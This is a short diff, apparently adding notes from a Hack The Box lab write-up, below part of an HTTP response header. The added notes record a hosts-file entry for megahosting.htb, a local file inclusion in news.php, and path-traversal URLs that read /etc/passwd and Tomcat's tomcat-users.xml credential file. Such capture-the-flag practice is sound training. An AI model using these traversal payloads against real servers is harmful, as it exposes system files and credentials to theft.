@@ -58,4 +58,16 @@ Date: Wed, 11 Mar 2026 19:18:45 GMT
 Server: Apache/2.4.41 (Ubuntu)
 Content-Type: text/html; charset=UTF-8
 
+** Add IP to my /etc/hosts file **
+"""
+cat /etc/hosts
+10.129.5.161 megahosting.htb
+"""
+
+LFI identified:
+http://megahosting.htb/news.php?file=../../../../etc/passwd
+
+Attempt to find tomcat users:
+http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
+http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml
 
